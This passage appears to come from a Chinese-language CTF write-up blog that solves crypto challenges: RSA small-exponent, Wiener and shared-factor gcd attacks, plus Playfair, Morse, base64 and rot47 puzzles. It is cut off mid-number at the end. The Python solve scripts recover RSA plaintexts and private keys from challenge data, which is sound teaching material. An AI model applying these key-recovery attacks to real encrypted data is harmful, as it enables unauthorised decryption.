夫夫 井王 土土 夫由 土夫 井中 士夫 王工 王人 土由 由口夫&#x27;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> z:</span><br><span class="line">   <span class="keyword">if</span> i <span class="keyword">in</span> x:</span><br><span class="line">      s += y[x.index(i)]</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      s += <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">ll = s.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(ll)):</span><br><span class="line">    t += chr(int(ll[i]) + i + <span class="number">1</span>)</span><br><span class="line">print(t.lower())</span><br></pre></td></tr></table></figure><h2 id="RSAROLL"><a href="#RSAROLL" class="headerlink" title="RSAROLL"></a>RSAROLL</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">e=<span class="number">19</span></span><br><span class="line">q=<span class="number">18443</span></span><br><span class="line">p=<span class="number">49891</span></span><br><span class="line">n=<span class="number">920139713</span></span><br><span class="line">phin = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e, phin)</span><br><span class="line">f=open(<span class="string">&#x27;/Users/apple/Desktop/data.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    m=pow(int(i),d,n)</span><br><span class="line">    flag+=chr(m)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="Dangerous-RSA"><a href="#Dangerous-RSA" class="headerlink" title="Dangerous RSA"></a>Dangerous RSA</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#n:  0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793L</span><br><span class="line">#e:  0x3</span><br><span class="line">#c:0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span><br><span class="line">so,how to get the message?</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n=<span class="number">0x52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793</span></span><br><span class="line">e=<span class="number">3</span>    </span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=<span class="number">0x10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365</span> </span><br><span class="line"><span class="keyword">print</span> time.asctime()    </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">200000000</span>):    </span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+n*k,<span class="number">3</span>)[<span class="number">1</span>]==<span class="number">1</span>:    </span><br><span class="line">        res=gmpy2.iroot(c+n*k,<span class="number">3</span>)[<span class="number">0</span>]    </span><br><span class="line">        <span class="keyword">print</span> k,res    </span><br><span class="line">        <span class="keyword">print</span> long_to_bytes(res)    </span><br><span class="line">        <span class="keyword">print</span> time.asctime()    </span><br><span class="line">        <span class="keyword">break</span>  </span><br></pre></td></tr></table></figure><h2 id="Cipher"><a href="#Cipher" class="headerlink" title="Cipher"></a>Cipher</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu 注意：得到的 flag 请包上 flag&#123;&#125; 提交, flag&#123;小写字母&#125;</span><br></pre></td></tr></table></figure><p>playfair密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from pycipher import Playfair</span><br><span class="line">a&#x3D;Playfair(&#39;playfirbcdeghkmnoqstuvwx&#39;).decipher(&#39;Dncnoqqfliqrpgeklwmppu&#39;)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>在线网站==<code>http://rumkin.com/tools/cipher/playfair.php</code>。</p><h2 id="AFCTF2018-Morse"><a href="#AFCTF2018-Morse" class="headerlink" title="[AFCTF2018]Morse"></a>[AFCTF2018]Morse</h2><p>莫斯密码解密-十六进制转换字符串。</p><h2 id="HDCTF2019-basic-rsa"><a href="#HDCTF2019-basic-rsa" class="headerlink" title="[HDCTF2019]basic rsa"></a>[HDCTF2019]basic rsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=<span class="number">262248800182277040650192055439906580479</span></span><br><span class="line">q=<span class="number">262854994239322828547925595487519915551</span></span><br><span class="line">e=<span class="number">65533</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="number">27565231154623519221597938803435789010285480123476977081867877272451638645710</span></span><br><span class="line">phi=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">d=int(gmpy2.invert(e,phi))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="达芬奇密码"><a href="#达芬奇密码" class="headerlink" title="达芬奇密码"></a>达芬奇密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">达芬奇隐藏在蒙娜丽莎中的数字列:1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711 </span><br><span class="line">记录在达芬奇窗台口的神秘数字串:36968853882116725547342176952286</span><br></pre></td></tr></table></figure><p>第零位1还是1，没有位移。</p><p>第一位233是斐波那契数列的第十二位（以0开始算），因此下面神秘数字串的第一位的6是原本flag的第十二位。</p><p>第二位3是斐波那契数列的第三位，因此下面神秘数字串的第二位的9是原本flag的第三位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#主要思路是遍历fakefibbo，然后找出对应哪一位，如fb中第二个数对应rb中第五个</span></span><br><span class="line"><span class="comment">#然后cipher对应fakebibbo,因此cipher中第二个数对应flag第五个数</span></span><br><span class="line"><span class="comment">#因此有reslut[4]=cipher[1],依次类推</span></span><br><span class="line">realfibbo = <span class="string">&#x27;1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309&#x27;</span></span><br><span class="line">fakefibbo = <span class="string">&#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;36968853882116725547342176952286&#x27;</span></span><br><span class="line">realfibbo = realfibbo.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">fakefibbo = fakefibbo.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">result = [<span class="string">&#x27;a&#x27;</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"><span class="comment">#这里要考虑到第二个1(fb[24])寻找的时候，会找到1123中第一个数，也就是index=0，而我们希望他找到第二个数，也就是index=1</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">24</span>):</span><br><span class="line">        index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        index = realfibbo.index(fakefibbo[i])</span><br><span class="line">    result[index] = cipher[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    print(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">##37995588256861228614165223347687[Finished in 0.2s]</span></span><br></pre></td></tr></table></figure><h2 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h2><p>求出d即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(hex(d)).hexdigest() + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>e太大尝试低解密指数攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener_hack</span>(<span class="params">e, n</span>):</span></span><br><span class="line">    <span class="comment"># firstly git clone https://github.com/pablocelayes/rsa-wiener-attack.git !</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k != <span class="number">0</span> <span class="keyword">and</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            discr = s * s - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> (discr &gt;= <span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t != <span class="number">-1</span> <span class="keyword">and</span> (s + t) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    n = <span class="number">101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471</span></span><br><span class="line">    e = <span class="number">46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085</span></span><br><span class="line">    c = <span class="number">38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</span></span><br><span class="line">    d = wiener_hack(e, n)</span><br><span class="line">    print(d)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="GXYCTF2019-CheckIn"><a href="#GXYCTF2019-CheckIn" class="headerlink" title="[GXYCTF2019]CheckIn"></a>[GXYCTF2019]CheckIn</h2><p><code>dikqTCpfRjA8fUBIMD5GNDkwMjNARkUwI0BFTg==</code>尝试base64解密</p><p><code>v)*L*_F0&lt;&#125;@H0&gt;F49023@FE0#@EN</code>,rot47解密，拿到flag。</p><h2 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h2><p>通过对不同的n进行gcd()算法，求出最大公约数，（即p）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n1 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c1 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line">c2 = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line">c3 = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line">n4 = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line">c4 = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line">n5 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c5 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">n6 = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line">c6 = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line">n7 = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line">c7 = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line">n8 = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line">c8 = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line">n9 = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line">c9 = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line">n10 = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line">c10 = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line">n11 = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line">c11 = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line">n12 = <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line">c12 = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line">n13 = <span 